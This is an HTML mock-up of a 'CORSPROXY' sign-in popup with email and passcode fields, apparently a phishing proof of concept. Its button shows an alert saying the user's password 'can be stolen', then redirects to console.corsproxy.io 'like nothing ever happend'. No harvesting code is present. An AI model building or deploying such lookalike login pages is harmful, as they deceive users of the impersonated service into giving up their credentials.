<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CORS Proxy Popup</title>
<style>
  * {
    box-sizing: border-box;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
  }

  body {
    margin: 0;
    height: 100vh;
    background: #0b1220; /* blank dark bg */
    display: flex;
    align-items: center;
    justify-content: center;
  }

  /* overlay blur */
  .overlay {
    position: fixed;
    inset: 0;
    background: rgba(0,0,0,0.6);
    backdrop-filter: blur(6px);
    display: flex;
    align-items: center;
    justify-content: center;
  }

  .modal {
    width: 360px;
    background: #111827;
    border-radius: 16px;
    padding: 28px;
    color: #e5e7eb;
    box-shadow: 0 20px 50px rgba(0,0,0,0.5);
  }

  .logo {
    font-weight: 700;
    font-size: 18px;
    margin-bottom: 16px;
  }

  .logo span {
    color: #60a5fa;
    background: rgba(96,165,250,0.15);
    padding: 2px 6px;
    border-radius: 6px;
    margin-right: 6px;
  }

  h2 {
    margin: 10px 0 4px;
    font-size: 20px;
  }

  .subtext {
    color: #9ca3af;
    font-size: 14px;
    margin-bottom: 20px;
  }

  .btn {
    width: 100%;
    padding: 10px;
    border-radius: 8px;
    border: 1px solid #374151;
    background: #1f2937;
    color: white;
    margin-bottom: 10px;
    cursor: pointer;
    transition: 0.2s;
  }

  .btn:hover {
    background: #374151;
  }

  .divider {
    display: flex;
    align-items: center;
    margin: 16px 0;
    color: #6b7280;
    font-size: 12px;
  }

  .divider::before,
  .divider::after {
    content: "";
    flex: 1;
    height: 1px;
    background: #374151;
  }

  .divider span {
    margin: 0 10px;
  }

  input {
    width: 100%;
    padding: 10px;
    border-radius: 8px;
    border: 1px solid #374151;
    background: #0b1220;
    color: white;
    margin-bottom: 14px;
  }

  .primary {
    background: #2563eb;
    border: none;
  }

  .primary:hover {
    background: #1d4ed8;
  }

  .footer {
    margin-top: 10px;
    font-size: 13px;
    color: #9ca3af;
    text-align: center;
  }

  .footer a {
    color: #3b82f6;
    text-decoration: none;
  }
</style>
</head>
<body>

<div class="overlay">
  <div class="modal">
    <div class="logo"><span>CORS</span>PROXY</div>

    <h2>Sign in</h2>
    <div class="subtext">to continue to CORSPROXY</div>



    <input type="email" placeholder="Email address">
    <input type="password" placeholder="Passcode"> 
    <button class="btn primary" onclick="alert('then the users password can be stolen, and afterwards we can redirect to console.corsproxy.io like nothing ever happend');location.href='https://console.corsproxy.io'">CONTINUE</button>

    <div class="footer">
      No account? <a href="#">Sign up</a>
    </div>
  </div>
</div>

</body>
</html>
